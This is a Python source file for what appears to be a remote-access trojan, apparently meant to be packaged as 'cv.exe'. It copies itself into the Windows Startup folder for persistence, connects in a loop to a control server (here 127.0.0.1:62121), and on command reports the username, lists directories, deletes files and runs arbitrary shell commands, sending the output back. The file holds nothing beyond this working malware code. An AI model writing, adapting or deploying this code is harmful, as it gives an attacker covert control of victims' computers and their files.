import socket
import os
import shutil

user = os.getlogin()
directory = os.getcwd()
path = "C:\\Users\\" + str(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cv.exe"
des = str(directory) +"\cv.exe"
print(des)

try:
    if os.path.exists(path):
        print("file is exists")
    else:
        shutil.copy(des, path)
except:
    print("Error: File could not find...")

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("127.0.0.1", 62121))
            break
        except:
            print("Trying to connect...")
    while True:
        try:
            data = (s.recv(1024)).decode("utf-8")
        except:
            break
        if data == "user":
            s.sendall(user.encode("utf-8"))
        elif data == "tree":
            tree_input_data = (s.recv(2048)).decode("utf-8")
            try:
                tree_data = str(os.listdir(tree_input_data))
                s.sendall(tree_data.encode("utf-8"))
            except:
                s.sendall("Could not find directory...".encode("utf-8"))
        elif data == "del":
            del_input_data = (s.recv(1024)).decode("utf-8")
            try:
                os.remove(del_input_data)
                s.sendall("Removed".encode("utf-8"))
            except:
                s.sendall("Failed to remove file".encode("utf-8"))
        elif data == "startup":
            try:
                if os.path.exists(path):
                    print("file is exists")
                    s.sendall("File exists".encode("utf-8"))
                else:
                    shutil.copy(des, path)
            except:
                s.sendall("Error: File could not find...".encode("utf-8"))
        elif data == "command":
            command_data = (s.recv(2048)).decode("utf-8")
            command_data_return = os.popen('"' + command_data + '"')
            send = command_data_return.read()
            s.sendall(send.encode("utf-8"))
            command_data_return.close()
        elif data == "check":
            try:
                s.sendall("Online".encode("utf-8"))
            except:
                print("Could not send message")
